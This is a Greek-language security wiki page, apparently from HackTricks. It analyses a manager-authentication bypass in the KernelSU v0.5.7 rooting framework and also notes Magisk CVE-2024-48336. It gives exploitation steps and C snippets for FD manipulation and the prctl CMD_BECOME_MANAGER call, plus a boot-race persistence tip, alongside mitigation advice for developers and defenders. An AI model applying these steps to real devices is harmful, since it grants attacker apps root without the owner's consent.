# Android Rooting Frameworks (KernelSU/Magisk) Παράκαμψη Auth του Manager & Abuse του Syscall Hook

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks όπως τα KernelSU, APatch και SKRoot κάνουν patch ή hook στον Android/Linux kernel και εκθέτουν privileged functionality σε μια unprivileged userspace manager app. Το Magisk εξετάζεται ξεχωριστά παρακάτω, επειδή το CVE-2024-48336 αφορούσε code loading στην πλευρά του manager και όχι αυτό το KernelSU syscall path.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Αυτή η σελίδα συνοψίζει τις τεχνικές και τις παγίδες που αποκαλύφθηκαν σε public research (κυρίως στην ανάλυση του KernelSU v0.5.7 από τη Zimperium), ώστε οι red και blue teams να κατανοούν τα attack surfaces, τα exploitation primitives και τα robust mitigations.<sup>[[1]](#references)</sup>

---
## Μοτίβο αρχιτεκτονικής: syscall-hooked manager channel

- Στο KernelSU v0.5.7, ένα kernel hook στο `prctl` λαμβάνει μια magic value, ένα command ID και command-specific arguments από το userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Ο caller ζητά πρώτα το manager status με `CMD_BECOME_MANAGER`. Η authorization είναι command-specific: το `CMD_GRANT_ROOT` ελέγχει την κατάσταση manager/allowlist, το `CMD_ALLOW_SU` είναι manager-only και το `CMD_SET_SEPOLICY` είναι root-only σε αυτή την έκδοση.<sup>[[2]](#references)[[11]](#references)</sup>
- Άλλα commands κάνουν query για version/configuration ή αναφέρουν framework events.<sup>[[2]](#references)</sup>
- Επειδή οποιοδήποτε app μπορεί να καλέσει αυτό το syscall interface, η ορθότητα του manager authentication είναι κρίσιμη.<sup>[[1]](#references)[[2]](#references)</sup>

Παράδειγμα (KernelSU design):
- Hooked syscall: prctl
- Magic value για redirect στο KernelSU handler: 0xDEADBEEF
- Τα commands περιλαμβάνουν: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT κ.λπ.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (όπως έχει υλοποιηθεί)

Όταν το userspace καλεί `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)`, το KernelSU επαληθεύει:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Έλεγχος path prefix
- Το path που παρέχεται πρέπει να ξεκινά με το αναμενόμενο prefix για το caller UID, π.χ. `/data/data/<pkg>` ή `/data/user/<id>/<pkg>`.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Έλεγχος ownership
- Το path πρέπει να ανήκει στο caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check μέσω FD table scan
- Γίνεται iterate στα open file descriptors του calling process με αύξουσα σειρά descriptor.
- Για κάθε regular file του οποίου το path ξεκινά με `/data/app/` και τελειώνει σε `/base.apk`, απαιτείται το path να περιέχει το package substring που προκύπτει από το παρεχόμενο data-directory path.
- Γίνεται verify το signature του πρώτου candidate που περνά αυτούς τους path checks.
- Γίνεται parse το APK v2 signature και verify έναντι του official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Αν περάσουν όλοι οι έλεγχοι, ο kernel κάνει προσωρινά cache το UID του manager. Τα manager-only commands στη συνέχεια αποδέχονται αυτό το UID, ενώ τα υπόλοιπα commands διατηρούν το δικό τους UID ή τους δικούς τους allowlist checks.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

Το KernelSU v0.5.7 δεν συνδέει το signature result με την installed package identity του PackageManager. Στο `manager.c`, το package test είναι μόνο ένας path substring check (`strstr(cwd, pkg)`), και στη συνέχεια γίνεται signature-check στο πρώτο candidate που περνά αυτόν τον έλεγχο. Ένας attacker μπορεί επομένως να τοποθετήσει ένα genuine manager APK κάτω από ένα `/data/app/` path που περιέχει επίσης το package name του attacker και να φροντίσει ώστε αυτό να επιλεγεί πρώτο.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Αυτό το trust-by-indirection επιτρέπει σε ένα unprivileged app να impersonate τον manager χωρίς να κατέχει το manager’s signing key.<sup>[[1]](#references)</sup>

Βασικές ιδιότητες που γίνονται exploit:<sup>[[1]](#references)[[3]](#references)</sup>
- Το FD scan είναι ordered by descriptor index και το package check είναι path substring test, όχι verified package-to-APK identity binding.
- Το `open()` επιστρέφει το lowest available FD. Κλείνοντας πρώτα τα lower-numbered FDs, ένας attacker μπορεί να ελέγξει το ordering.
- Ένα bundled manager APK μπορεί να τοποθετηθεί κάτω από `/data/app/` σε path που περιέχει το package string του attacker, διατηρώντας παράλληλα το official manager signature.

---
## Attack preconditions

Η συγκεκριμένη περίπτωση του KernelSU v0.5.7 απαιτεί:<sup>[[1]](#references)[[3]](#references)</sup>

- Η συσκευή να είναι ήδη rooted με ένα vulnerable rooting framework (π.χ. KernelSU v0.5.7).
- Ο attacker να μπορεί να εκτελέσει arbitrary unprivileged code τοπικά (Android app process).
- Για την υλοποίηση v0.5.7, το `current->real_parent` πρέπει να έχει UID 0 (το source comment το περιγράφει ως zygote direct-child requirement). Το `manager.c` απορρίπτει άλλους parents.<sup>[[3]](#references)</sup>
- Ο πραγματικός manager να μην έχει ακόμη authenticated (π.χ. αμέσως μετά από reboot). Ορισμένα frameworks κάνουν cache το manager UID μετά την επιτυχία· πρέπει να κερδίσετε το race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Βήματα υψηλού επιπέδου (το demo video δείχνει το public proof of concept σε λειτουργία):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Δημιουργήστε ένα valid path προς το δικό σας app data directory, ώστε να ικανοποιούνται οι prefix και ownership checks.
2) Τοποθετήστε ένα genuine KernelSU Manager `base.apk` κάτω από `/data/app/` σε path που περιέχει το package string σας και ανοίξτε το σε lower-numbered FD από το δικό σας `base.apk`.
3) Καλέστε `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` για να περάσετε τους checks.
4) Χρησιμοποιήστε `CMD_GRANT_ROOT` και στη συνέχεια `CMD_ALLOW_SU` για persistent su. Καλέστε το root-only `CMD_SET_SEPOLICY` μόνο αφού αποκτήσετε root και μόνο όπου υποστηρίζεται.

Πρακτικές σημειώσεις για το step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Εντοπίστε το FD του process σας για το δικό σας `/data/app/*/base.apk`, κάνοντας walk στα `/proc/self/fd` symlinks.
- Κλείστε ένα low FD (π.χ. stdin, fd 0) και ανοίξτε πρώτα το legitimate manager APK, ώστε να καταλάβει το fd 0 (ή οποιοδήποτε index είναι μικρότερο από το δικό σας base.apk fd).
- Κάντε bundle το legitimate manager APK με το app σας, ώστε το path του να ξεκινά με `/data/app/`, να τελειώνει σε `/base.apk` και να περιέχει το package string σας. Για παράδειγμα, ένα path κάτω από το `lib` directory του app σας μπορεί να ικανοποιεί αυτούς τους checks.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Ανάγκασε ένα FD με μικρότερο αριθμό να δείχνει στο νόμιμο manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Έλεγχος ταυτότητας του Manager μέσω του hook `prctl` του KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Μετά την επιτυχία, privileged commands (παραδείγματα):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: προαγωγή της τρέχουσας διεργασίας σε root
- CMD_ALLOW_SU: προσθήκη του package/UID σας στη allowlist για persistent su
- CMD_SET_SEPOLICY: προσαρμογή της πολιτικής SELinux μετά την απόκτηση root· το KernelSU v0.5.7 ελέγχει για UID 0 για αυτήν την εντολή.<sup>[[2]](#references)</sup>

Συμβουλή για race/persistence:
- Καταχωρίστε έναν BOOT_COMPLETED receiver στο AndroidManifest (`RECEIVE_BOOT_COMPLETED`) ώστε να ξεκινά μετά την επανεκκίνηση και να επιχειρεί authentication πριν από τον πραγματικό manager· η permission εξουσιοδοτεί τη λήψη του `ACTION_BOOT_COMPLETED`, αλλά από μόνη της δεν εγγυάται priority στον προγραμματισμό.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Οδηγίες detection και mitigation

Για developers framework:
- Συνδέστε το authentication με το package/UID του caller, όχι με αυθαίρετα FDs:
- Επιλύστε το package του caller από το UID του και επαληθεύστε το με βάση το signature του εγκατεστημένου package (μέσω PackageManager), αντί να κάνετε scanning FDs.
- Αν χρησιμοποιείται μόνο ο kernel, αξιοποιήστε stable caller identity (task creds) και επικυρώστε την από μια stable source of truth που διαχειρίζεται από init/userspace helper, όχι από process FDs.
- Αποφύγετε τους ελέγχους path-prefix ως identity· μπορούν να ικανοποιηθούν trivially από τον caller.
- Χρησιμοποιήστε challenge–response βασισμένο σε nonce μέσω του channel και εκκαθαρίστε οποιοδήποτε cached manager identity κατά την εκκίνηση ή σε key events.
- Εξετάστε authenticated IPC βασισμένο σε binder αντί για overload των generic syscalls, όπου είναι εφικτό.

Για defenders/blue team:
- Εντοπίστε την παρουσία rooting frameworks και manager processes· παρακολουθήστε calls προς prctl με ύποπτες magic constants (π.χ. 0xDEADBEEF), εφόσον διαθέτετε kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Σε managed fleets, αποκλείστε ή δημιουργήστε alert για boot receivers από untrusted packages που επιχειρούν rapid privileged manager commands μετά την εκκίνηση.
- Βεβαιωθείτε ότι οι συσκευές έχουν ενημερωθεί σε patched framework versions· ακυρώστε τα cached manager IDs μετά από update.

Περιορισμοί της επίθεσης:<sup>[[1]](#references)[[2]](#references)</sup>
- Επηρεάζει μόνο συσκευές που είναι ήδη rooted με vulnerable framework.
- Συνήθως απαιτεί reboot/race window πριν από το authentication του legitimate manager (ορισμένα frameworks αποθηκεύουν σε cache το manager UID μέχρι να γίνει reset).

---
## Σχετικές σημειώσεις μεταξύ frameworks

- Το password-based auth (π.χ. historical APatch/SKRoot builds) μπορεί να είναι αδύναμο αν τα passwords είναι guessable/bruteforceable ή αν τα validations έχουν bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Το package/signature-based auth (π.χ. KernelSU) είναι ισχυρότερο κατ’ αρχήν, αλλά πρέπει να συνδέεται με τον actual caller και όχι με path-derived artefacts που επιλέγονται μέσω FD scans.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: Το CVE-2024-48336 επηρέασε builds πριν από το Canary 27007, τα οποία φόρτωναν code από unverified GMS package, επιτρέποντας σε local app να εκτελέσει code μέσα στο Magisk app και να κάνει escalate σε root χωρίς user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Το Rooting Όλων των Κακών: Κενά ασφαλείας που θα μπορούσαν να θέσουν σε κίνδυνο την κινητή συσκευή σας](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – έλεγχοι authentication στο core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – επανάληψη FD, έλεγχος package και call signature στο manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – επαλήθευση APK v2 στο apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Project KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Επαλήθευση ότι το GMS είναι system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Βίντεο επίδειξης KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifiers εντολών στο ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
